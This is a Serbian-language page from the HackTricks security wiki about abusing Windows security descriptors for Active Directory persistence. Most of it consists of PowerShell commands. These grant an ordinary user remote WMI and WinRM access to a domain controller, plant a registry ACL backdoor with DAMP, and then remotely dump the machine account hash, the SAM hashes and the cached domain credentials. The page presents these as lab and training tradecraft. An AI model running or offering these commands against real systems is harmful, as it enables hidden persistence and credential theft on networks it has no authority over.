# Security Descriptors

{{#include ../../banners/hacktricks-training.md}}

## Security Descriptors

[From the docs](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Security Descriptor Definition Language (SDDL) definiše format koji se koristi za opisivanje sigurnosnog deskriptora. SDDL koristi ACE stringove za DACL i SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`

**Sigurnosni deskriptori** se koriste za **čuvanje** **dozvola** koje **objekat** ima **nad** **objektom**. Ako možete samo **napraviti** **malo promene** u **sigurnosnom deskriptoru** objekta, možete dobiti veoma zanimljive privilegije nad tim objektom bez potrebe da budete član privilegovane grupe.

Ova tehnika postojanosti se zasniva na sposobnosti da se osvoje sve privilegije potrebne protiv određenih objekata, kako bi se mogla izvršiti radnja koja obično zahteva admin privilegije, ali bez potrebe da se bude admin.

### Access to WMI

Možete dati korisniku pristup da **izvrši udaljeno WMI** [**koristeći ovo**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### Pristup WinRM

Dajte pristup **winrm PS konzoli korisniku** [**koristeći ovo**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Daljinski pristup hešovima

Pristupite **registru** i **izvršite dump hešova** kreirajući **Reg backdoor koristeći** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** tako da u bilo kojem trenutku možete da preuzmete **heš računara**, **SAM** i bilo koju **keširanu AD** kredenciju na računaru. Dakle, veoma je korisno dati ovu dozvolu **običnom korisniku protiv računara Domain Controller**:
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Proverite [**Silver Tickets**](silver-ticket.md) da saznate kako možete koristiti hash računa računara kontrolera domena.

{{#include ../../banners/hacktricks-training.md}}
